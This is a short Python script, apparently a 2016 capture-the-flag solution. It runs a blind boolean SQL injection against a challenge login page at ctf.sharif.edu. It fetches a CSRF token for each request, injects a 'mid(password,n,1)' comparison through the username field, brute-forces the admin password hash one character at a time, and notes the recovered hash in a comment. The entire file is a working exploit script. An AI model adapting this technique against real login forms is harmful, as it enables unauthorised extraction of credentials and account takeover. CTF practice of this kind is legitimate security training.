'''
Created on 2016-2-6

@author: wenhuizone
'''
#!/usr/bin/python

import requests
import string


URL='http://ctf.sharif.edu:35455/chal/hackme/705f718b432345e0/login.php'


resp=requests.get(URL).headers
cookie1=resp['set-cookie'][0:35]
headers={
    'Host': 'ctf.sharif.edu:35455',
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
    'Cookie':'%s' % cookie1

}


list='0123456789abcdefghijklmnopqrstuvwxyz'
def post(i):
    resp=requests.get(URL,headers=headers).text
    start=resp.find('user_token')
    token=resp[start+19:start+51]
    payload={
        'Login':'Login',
        'username':'%s' %i ,
        'password':'a',
        'user_token':'%s' % token
    }
    re=requests.post(URL,headers=headers,data=payload).text
    start=resp.find('user_token')
    token=resp[start+19:start+51]
    return 'User Name or Password incorrect' in re
p='26a340b11385eeb'
for n in range(15,33):
    for i in list:
        x="admin' and(select mid(password,%s,1))='%s' or '1'='1" %(n,i)
        if not(post(x)):
            p=p+i
            print 'password:%s' % p
            break

#password:26a340b11385ebc2db3b462ec2fdfda4